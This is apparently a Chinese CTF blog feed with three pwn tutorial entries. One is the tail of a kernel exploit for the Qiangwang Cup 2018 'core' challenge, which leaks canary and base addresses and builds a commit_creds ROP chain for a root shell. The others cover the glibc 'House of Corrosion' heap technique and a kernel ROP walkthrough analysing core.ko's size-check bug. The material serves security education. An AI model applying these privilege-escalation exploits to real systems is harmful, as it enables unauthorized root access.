//把canary读入用户态的buf </span><br><span class="line">    size_t pop_rdi = 0x000b2f;</span><br><span class="line">    size_t push_rax = 0x02d112;</span><br><span class="line">    size_t swapgs = 0x0d6;</span><br><span class="line">    size_t iretq ;</span><br><span class="line">    size_t xchg = 0x16684f0;</span><br><span class="line">    size_t call_rax = 0x40398;</span><br><span class="line">    size_t pop_rcx = 0x21e53;</span><br><span class="line">    size_t pop_rbp = 0x3c4;</span><br><span class="line">    size_t pop_rdx = 0xa0f49;</span><br><span class="line">    size_t mov_rdi_rax_call_rdx = 0x01aa6a;</span><br><span class="line">    //此时buf的前八个字节是我们的canary</span><br><span class="line">    canary = (*(size_t *)(&amp;buf[0]));</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] leak success! .\033[0m&quot;);</span><br><span class="line">    printf(&quot;\033[34m\033[1m[*] Canary  &gt;&gt; %p.\033[0m\n&quot;,canary);</span><br><span class="line">    core_base = (*(size_t *)(&amp;buf[2*8])) - 0x19b;</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] leak success! .\033[0m&quot;);</span><br><span class="line">    printf(&quot;\033[34m\033[1m[*] core_base  &gt;&gt; %p.\033[0m\n&quot;,core_base);</span><br><span class="line">    vmlinux_base = (*(size_t *)(&amp;buf[4*8]) - 0x1dd6d1);</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] leak success! .\033[0m&quot;);</span><br><span class="line">    printf(&quot;\033[34m\033[1m[*] vmlinux_base  &gt;&gt; %p.\033[0m\n&quot;,vmlinux_base);</span><br><span class="line">    pop_rdi += vmlinux_base;</span><br><span class="line">    pop_rcx += vmlinux_base;</span><br><span class="line">    pop_rbp += vmlinux_base;</span><br><span class="line">    pop_rdx += vmlinux_base;</span><br><span class="line">    mov_rdi_rax_call_rdx += vmlinux_base;</span><br><span class="line">    swapgs += core_base;</span><br><span class="line">    iretq = 0x50ac2 + vmlinux_base;</span><br><span class="line">    commit_creds += vmlinux_base;</span><br><span class="line">    prepare_kernel_cred += vmlinux_base;</span><br><span class="line">    size_t swapgs_restore_regs_and_return_to_usermode = 0xa008da + vmlinux_base;</span><br><span class="line">    int i = 0;</span><br><span class="line">    for(i=0;i&lt;10;i++)&#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    i = 10;</span><br><span class="line">    rop[i++] = pop_rdi; </span><br><span class="line">    rop[i++] = 0;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;</span><br><span class="line">    rop[i++] = pop_rdx;</span><br><span class="line">    rop[i++] = pop_rcx;</span><br><span class="line">    rop[i++] = mov_rdi_rax_call_rdx;</span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line">    rop[i++] = swapgs_restore_regs_and_return_to_usermode+22; </span><br><span class="line">    rop[i++] = 0;</span><br><span class="line">    rop[i++] = 0;</span><br><span class="line">    rop[i++] = (size_t)get_shell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    write(fd,rop,i*8);</span><br><span class="line">    core_copy_func(fd,0xf000000000000000+i*8);</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] Attack Success! .\033[0m&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012752743.png" alt="image-20250720185702429"></p><p>成功提权</p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/kpti-bypass/">https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/kpti-bypass/</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House of Corrosion</title>
      <link href="/posts/16109.html"/>
      <url>/posts/16109.html</url>
      
        <content type="html"><![CDATA[<h1 id="House-of-corrosion"><a href="#House-of-corrosion" class="headerlink" title="House of corrosion"></a>House of corrosion</h1><h3 id="利用范围："><a href="#利用范围：" class="headerlink" title="利用范围："></a>利用范围：</h3><ul><li>2.23  -  至今</li></ul><h3 id="利用效果："><a href="#利用效果：" class="headerlink" title="利用效果："></a>利用效果：</h3><ul><li>任意地址读</li><li>任意地址写</li><li>任意地址值转移</li></ul><h3 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h3><ul><li><p>需要一个UAF漏洞</p></li><li><p>可以分配较大的堆块（size &lt;&#x3D; 0x3b00）</p></li><li><p>不需要泄露地址</p></li></ul><h3 id="利用原理："><a href="#利用原理：" class="headerlink" title="利用原理："></a>利用原理：</h3><p>House of corrosion 是一个针对于 global_max_fast 的相关利用技巧 ，通过一些其他的手法 ，把 global_max_fast 修改成一个极大值 ，比如 unsortedbin attack 、largebinattack 、tcache stashing unlink 等 （利用 unsortedbin attack 时不需要泄露地址，爆破 1&#x2F;16 即可） ，于是我们就可以实现任意地址读写的功能 。</p><p>要想知道 House of corrosion 的具体原理 ，我们就要知道 global_max_fastbin 是什么 。</p><p><code>global_max_fast</code> 是 glibc 堆管理器（ptmalloc2）中的一个全局变量，用于定义 <code>fastbins</code> 的最大 chunk 大小 。它决定了哪些内存块会被放入 <code>fastbins</code> 进行快速分配和释放，而不是进入更慢的 <code>smallbins</code> 或<code>unsorted bin</code> ，在引入tcachebin之前（GLIBC2.27之前），<code>global_max_fast</code> 的默认值为 0x80 也就是 <code>fastbin</code> 的size默认范围在 [0x20,0x80] </p><p>如果我们往 <code>global_max_fast</code> 输入一个极大值的话，我们就可以造成 <code>fastbinY</code> 数组溢出 , 这样会使得我们在 malloc 和 free 堆块的时候 ，很大的 size 堆块都会被判定为是 <code>fastbin</code> 类型的堆块，<code>fastbinY</code> 是在glibc上储存<code>fastbin</code>不同大小链表头指针的一段空间，为大小从 0x20 开始的 <code>fastbin</code> 链表预留了十个指针 。</p><p>这就意味着，如果有size超过 0xb0 大小的堆块，那么这个堆块的索引值就会超出 <code>fastbinsY</code> 的最大范围 ，造成数组越界 ，通过这个原理，我们就可以把 <code>fastbinY</code>溢出到我们想要的位置 。</p><h3 id="利用技巧："><a href="#利用技巧：" class="headerlink" title="利用技巧："></a>利用技巧：</h3><p><strong>溢出到目标位置的计算公式：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk size = (chunk addr - &amp;main_arena.fastbinsY) x 2 + 0x2</span><br></pre></td></tr></table></figure><h4 id="读原语："><a href="#读原语：" class="headerlink" title="读原语："></a>读原语：</h4><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250808164333637.png" alt="image-20250808153203066" style="zoom: 50%;" /><p>想要读取到目标地址 <code>X</code> 上的 <code>Y</code>，我们可以通过释放<code>fastbin A</code> 到 <code>X</code> 处 , 这样我们的 <code>A</code> 的 <code>fd</code> 指针就指向了 <code>Y</code> ，通过打印就可以打印出 <code>Y</code> 的信息 。</p><h4 id="写原语1："><a href="#写原语1：" class="headerlink" title="写原语1："></a>写原语1：</h4><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250808164339824.png" alt="image-20250808153403693" style="zoom: 67%;" /><p>通过释放 <code>fastbin A</code> 到目标地址 <code>X</code> ，然后使用UAF漏洞修改 <code>A</code> 的 <code>fd</code> 指针为目标值<code>B</code> ，然后把 <code>A</code> 申请回来，这样我们就可以向 <code>X</code> 写入目标值 <code>B</code> 。</p><h4 id="写原语2："><a href="#写原语2：" class="headerlink" title="写原语2："></a>写原语2：</h4><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250808164341567.png" alt="image-20250808154110778" style="zoom:67%;" /><p>我们想要把地址 <code>M</code> 上的 <code>N</code> 转移到 <code>X</code> 上 </p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250808164343070.png" alt="image-20250808154338784" style="zoom:67%;" /><p>就可以先通过UAF，部分写 <code>A</code> 的 <code>fd</code> 指针使其指向本身 ，形成类似 double free 的情况 </p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250808164348004.png" alt="image-20250808154731342" style="zoom:67%;" /><p>再把 <code>A</code> 给申请回来，纂改 <code>A</code> 的 size ，然后释放掉 <code>A</code> ，使其落到  <code>M</code> 处 ，此时 <code>A</code> 的 <code>fd</code> 指针变成了目标值 <code>N</code> </p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250808164345525.png" alt="image-20250808155322692" style="zoom:67%;" /><p>再次纂改<code>A</code> 的 size ，使其落入 <code>X</code> ，然后我们把 <code>A</code> 给申请回来，就可以实现转移操作，将地址 <code>M</code> 的值 <code>N</code> 转移到地址 <code>X</code> 上 。</p><h3 id="相关技巧："><a href="#相关技巧：" class="headerlink" title="相关技巧："></a>相关技巧：</h3><p>虽然现在都可以使用 House of corrosion ，但是在 <code>glibc-2.37</code> 版本中 ，<code>global_max_fast</code> 的数据类型被修改成了 <code>int8_u</code> ，进而导致可控的空间范围大幅度缩小 。</p><h3 id="组合利用："><a href="#组合利用：" class="headerlink" title="组合利用："></a>组合利用：</h3><p>House of corrosion 可以和多数手法组合利用，达到意想不到的效果，就比如可以结合 House of husk ，将 <code>__printf_arginfo_table</code>以及 <code>__printf_function_table</code> 修改成已知堆块地址然后进行进一步攻击，又或者说是 House of apple2 ，劫持 <code>_IO_list_all</code> 到已知堆块地址，进行 <code>IO_FILE</code>的伪造，又或是说可以结合 House of kiwi ，由于 House of kiwi 的手法利用需要触发 <code>assert</code> ，所以我们可以利用 House of corrosion 来修改 Topchunk 的 size ，使其变得不合法 ，再次申请大于写入 size 的堆块就能触发 <code>assert</code> ，总而言之，House of corrosion 的利用可以配合其他攻击手法，让我们的攻击更加灵活，还有很多组合利用方式，可以自己发挥想象。</p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://xz.aliyun.com/news/6458">https://xz.aliyun.com/news/6458</a></p><p><a href="https://zhuanlan.zhihu.com/p/448880453">https://zhuanlan.zhihu.com/p/448880453</a></p><p><a href="https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#29-house-of-corrosion">https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#29-house-of-corrosion</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> House of 系列手法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kernel初识 - Kernel ROP</title>
      <link href="/posts/16108.html"/>
      <url>/posts/16108.html</url>
      
        <content type="html"><![CDATA[<h1 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h1><p>ROP 即<code>返回导向编程</code>（Return-oriented programming），应当是大家比较熟悉的一种攻击方式——通过复用代码片段的方式控制程序执行流。</p><p><strong>内核态的 ROP 与用户态的 ROP 一般无二，只不过利用的 gadget 变成了内核中的 gadget，所需要构造执行的 ropchain 由</strong> <code>system(&quot;/bin/sh&quot;)</code> <strong>变为了</strong> <code>commit_creds(&amp;init_cred)</code> 或 <code>commit_creds(prepare_kernel_cred(NULL))</code>，当我们成功地在内核中执行这样的代码后，当前线程的 cred 结构体便变为 init 进程的 cred 的拷贝，我们也就获得了 root 权限，此时在用户态起一个 shell 便能获得 root shell。</p><h2 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h2><p>通常情况下，我们的 exploit 需要进入到内核当中完成提权，而我们最终仍然需要<strong>着陆回用户态</strong>以获得一个 root 权限的 shell，因此在我们的 exploit 进入内核态之前我们需要<strong>手动模拟用户态进入内核态的准备工作</strong>——<strong>保存各寄存器的值到内核栈上</strong>，以便于后续着陆回用户态。</p><p>通常情况下使用如下函数保存各寄存器值到我们自己定义的变量中，以便于构造 rop 链：</p><p>算是一个通用的 pwn 板子。</p><p>方便起见，使用了内联汇编，由于编写风格是 Intel 汇编，编译时需要指定参数：<code>-masm=intel</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">size_t user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line">void save_status(void)</span><br><span class="line">&#123;</span><br><span class="line">    asm volatile (</span><br><span class="line">        &quot;mov user_cs, cs;&quot;</span><br><span class="line">        &quot;mov user_ss, ss;&quot;</span><br><span class="line">        &quot;mov user_sp, rsp;&quot;</span><br><span class="line">        &quot;pushf;&quot;</span><br><span class="line">        &quot;pop user_rflags;&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h2><p>由内核态返回用户态只需要：</p><ul><li><code>swapgs</code> 指令恢复用户态 GS 寄存器</li><li><code>sysretq</code> 或者 <code>iretq</code> 恢复到用户空间</li></ul><p>那么我们只需要在内核中找到相应的 gadget 并执行 <code>swapgs;iretq</code> 就可以成功着陆回用户态。</p><p>通常来说，我们应当构造如下 rop 链以返回用户态并获得一个 shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">↓   swapgs</span><br><span class="line">0</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags //64bit user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure><p>需要注意的是，在返回用户态执行 <code>system()</code> 函数时同样有可能遇到栈不平衡导致函数执行失败并最终 Segmentation Fault 的问题，因此在本地调试时若遇到此类问题，则可以将 <code>user_sp</code> 的值加减 <code>8</code> 以进行调整。</p><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>首先修改init文件，添加以下命令，以便可以获取core.ko的代码段的基址。这样内核启动时就是root权限，当然这是为了调试方便，真正执行exp可以去掉这条命令 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br></pre></td></tr></table></figure><p>然后重新打包文件系统，运行start.sh起内核，在qemu中查找core.ko的.text段的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ # cat /sys/module/core/sections/.text</span><br><span class="line">0xffffffffc0205000</span><br></pre></td></tr></table></figure><p>在另外一个terminal中启动gdb：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vmlinux -q</span><br></pre></td></tr></table></figure><p>然后添加core.ko的符号表，加载了符号表之后就可以直接对函数名下断点了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ add-symbol-file ./core.ko 0xffffffffc0205000</span><br><span class="line">add symbol table from file &quot;./core.ko&quot; at</span><br><span class="line">  .text_addr = 0xffffffffc0205000</span><br><span class="line">Reading symbols from ./core.ko...(no debugging symbols found)...done.</span><br></pre></td></tr></table></figure><p>然后运行以下命令连接qemu进行调试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure><h2 id="exp编译"><a href="#exp编译" class="headerlink" title="exp编译"></a>exp编译</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exploit.c -static -masm=intel -g -o exploit</span><br></pre></td></tr></table></figure><h2 id="例题：强网杯-2018-core"><a href="#例题：强网杯-2018-core" class="headerlink" title="例题：强网杯 2018 - core"></a>例题：强网杯 2018 - core</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184832224.png" alt="image-20250807183616766"></p><p>题目给了我们四个文件分别是 bzImage 、core.cpio 、start.sh 、vmlinux </p><p>core.cpio 是一个打包文件，解包里面有文件系统 ，其中 vmlinux 命名的是内核的二进制文件， 而 core.ko 是存在漏洞的驱动，也就是题目分析的二进制文件 。</p><p>start.sh 是启动脚本 ，标明启动方法、保护措施等。</p><p>bzImage 是镜像文件 </p><p>类比用户态的pwn，.ko 文件就是 binary 文件 ，vmlinux 就是 libc ，不同保护机制是由如何启动来决定的 。</p><p>如果题目中没有提供 vmlinux ，那么我们可以通过<code> ./extract-vmlinux ./bzImage &gt; vmlinux</code> 来从镜像文件中提取 vmlinux 。</p><p>和用户态做题思路一致，我们可以先观察一下程序开启了什么样的保护 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184843577.png" alt="image-20250714121645586"></p><p><code>qemu-system-x86_64 </code> 代表的是模拟 x86_64 架构的计算机系统 。</p><p><code>-m 256M </code> 代表的是内核的运行内存大小分配，其实题目一开始是分配 64M 大小的内存空间，但是我发现启动不了，于是我就把这个调到 256M 了 ，</p><p><code>-kernel ./bzlmage</code> 指定要启动的 Linux 内核镜像文件 。bzImage 属于压缩格式的镜像文件，是 Linux 内核编译后生成的可执行文件。</p><p><code>initrd ./core.cpio</code> 这是用来指定初始化 RAM 磁盘 (initrd) 的文件。initrd 是一个临时的根文件系统 ，在 Linux 内核的早期阶段会被加载。它包含了内核启动所需要的基本驱动程序和工具 。</p><p><code>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</code> 此参数用于向内核传递启动参数</p><ul><li><code>root=/dev/ram</code> 告知内核根文件系统位于 RAM 中，也就是之前通过 <code>-initrd</code> 参数指定的 initrd 。</li><li><code>rw</code>： 将跟文件系统设置为可读写模式 。</li><li><code>console=ttys0</code>：把串口（ttyS0）设置为控制台 ，这样所有输出的信息都会通过串口显示，这在<code>-nographic</code> 模式下尤为重要 。</li><li><code>oops=panic</code>：当系统文件出现严重（oops）时 ，让内核直接进入 panic 状态 。</li><li><code>panic=1</code>：内核进入 panic 状态后 ，1 秒后自动重启系统 。</li><li><code>quiet</code>：开启静默启动模式，只显示关键的启动信息，减少不必要的输出 。</li><li><code>kaslr</code>：启用内核地址空间布局随机化（KASLR），增强系统的安全性 。</li></ul><p><strong>-s</strong></p><p>这个是 <code>-gdb tcp::1234</code> 的简写形式 ，其功能是在 TCP 端口 1234 上开启 GDB 调试服务器 。通过这个服务器，你可以使用 GDB 远程调试内核 。</p><p><code>-netdev user,id=t0 -device e1000,netdev=t0,id=nic0</code></p><p>这部分用于配置虚拟机的网络设备：</p><ul><li><code>-netdev user,id=t0</code>：创建一个用户模式的网络设备，设备 ID 为 t0。这种网络模式提供了简单的网络功能，支持 NAT 转换，能让虚拟机访问外部网络。</li><li><code>-device e1000,netdev=t0,id=nic0</code>：为虚拟机添加一个 e1000 型号的网卡，该网卡连接到之前创建的网络设备 t0，网卡 ID 为 nic0。</li></ul><p><code>-nographic</code></p><p>该参数用于禁用图形输出，让 QEMU 以纯文本模式运行。此时，虚拟机的控制台输出会通过串口（ttyS0）显示在终端上，这对于没有图形界面的系统调试非常实用。</p><p>这些参数有的只要了解一个大概就行了 ，主要我们还是看内核的架构和保护 ，这道题目只开启了 <code>kaslr</code> ,也就是空间地址随机化。</p><p>接下来我们解压打包文件 ，查看文件系统，我之前用 Ubuntu 的时候，双击这个 core.cpio 就可以一键解压这个打包文件了 ，但是我后面换到了 WSL - Ubuntu-22.04 ，也就是子系统Ubuntu，但是它好像不支持这个快捷解压方式 ，所以我只能通过以下一些命令来对这个 core.cpio 进行一个解压：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir core</span><br><span class="line">cd core </span><br><span class="line">mv ../core.cpio core.cpio.gz</span><br><span class="line">gunzip ./core.cpio.gz</span><br><span class="line">cpio -idm &lt; ./core.cpio</span><br></pre></td></tr></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184847836.png" alt="image-20250714125048599"></p><p>这就是解压后的一个文件状态 ，之前说过我们漏洞的主要分析是在这个 core.ko 文件里面的 ，我们先来看一下 init 初始化启动脚本：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184849768.png" alt="image-20250714125420323"></p><p>这里面我看得也不是很懂，所以我就直接引用 ctfwiki 里面的原话了：</p><ul><li>第 9 行中把 <code>kallsyms</code> 的内容保存到了 <code>/tmp/kallsyms</code> 中，那么我们就能从 <code>/tmp/kallsyms</code> 中读取 <code>commit_creds</code>，<code>prepare_kernel_cred</code> 的函数的地址了。</li><li>第 10 行把 <code>kptr_restrict</code> 设为 1，这样就不能通过 <code>/proc/kallsyms</code> 查看函数地址了，但第 9 行已经把其中的信息保存到了一个可读的文件中，这句就无关紧要了。</li><li>第 11 行把 <code>dmesg_restrict</code> 设为 1，这样就不能通过 <code>dmesg</code> 查看 kernel 的信息了。</li><li>第 18 行设置了定时关机，为了避免本地做题时产生干扰，我们可以把这句删掉然后重新打包（已经被我删掉了）。</li></ul><p>经过一些前置内核知识的学习 ，由于 kernel pwn 的最终目的是提权到 root ，一种简单方便的方法就是执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(0));</span><br></pre></td></tr></table></figure><p>看来这个 <code>proc/kallsyms</code> 中保存了这两个函数的地址 ，虽然后面关闭了 <code>/proc/kallsyms</code> 的读取，但是好在我们的init初始化脚本给我们保存到了 <code>/tmp/kallsyms</code> ，我们后面可以在这里进行一个函数地址的读取 。</p><p>修改完成之后，我们先删除之前的打包文件 core.cpio , 然后我们再次对文件系统进行一个打包 。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184854209.png" alt="image-20250714130526337"></p><p>由于题目给了我们一个方便打包的脚本，所以我们可以利用这个快速打包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm core.cpio</span><br><span class="line">./gen_cpio.sh core.cpio</span><br></pre></td></tr></table></figure><p>打包好之后我们就可以获得一个新的 core.cpio 文件 ，我们将这个core.cpio文件移到之前的文件夹，然后退出 core 文件夹 ，尝试使用 start.sh 启动脚本对内核进行一个启动。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184855820.png" alt="image-20250714131039009"></p><p>这就是启动成功的一个状态，可以看到 vscode 提示我们开启了一个端口 ，就是之前在 start.sh 启动文件设置的 <code>-s</code> ，在 TCP::1234 端口上开启一个 GDB 的远程调试服务器， 我们就可以通过这个端口来调试内核了 。</p><p>exit 退出内核， 我们开始前往 core 文件夹分析 core.ko 的程序漏洞 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184934247.png" alt="image-20250714131514614"></p><p>amd64架构 ，canary保护 ，NX保护 ，我们接着用 IDA 打开这个 core.ko</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184936729.png" alt="image-20250714142935369"></p><p>init_module 函数创造了 &#x2F;proc&#x2F;core 接口 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184857725.png" alt="image-20250714143020452"></p><p>exit_core 函数删除了 &#x2F;proc&#x2F;core 接口</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184859253.png" alt="image-20250714143838810"></p><p>交互函数 core_ioctl（）定义了三条命令 ，分别是调用 core_read（），core_copy_func（）和设置全局变量 off ：</p><p>core_read（）：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184900774.png" alt="image-20250714143959039"></p><p>从 v5[off] 拷贝 64 个字节到用户空间 ，由于全局变量off是我们可以控制的，所以我们可以合理的控制 <code>off</code> 来 leak canary 和栈上的一些其他数据 。</p><p>core_copy_func（）：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184902057.png" alt="image-20250714150656178"></p><p>我们的漏洞主要出现在这里 ，这里从 name 区域复制了a1个字节的数据到v2 ，但是我们这个a1前面有个检查要求小于等于63 ，可是我们通过观察数据类型发现， a1的数据类型由 int64 转化成了 unsigned __int16 ，也就是由有符号转化成无符号数据类型，这个时候，我们就可以让 a1 等于一个小于0的数据，比如说是0xffffffffffff0000|(0x100) ，我们就可以绕过这个检查，实现栈溢出 。</p><p>core_write（）：</p><p><img src= 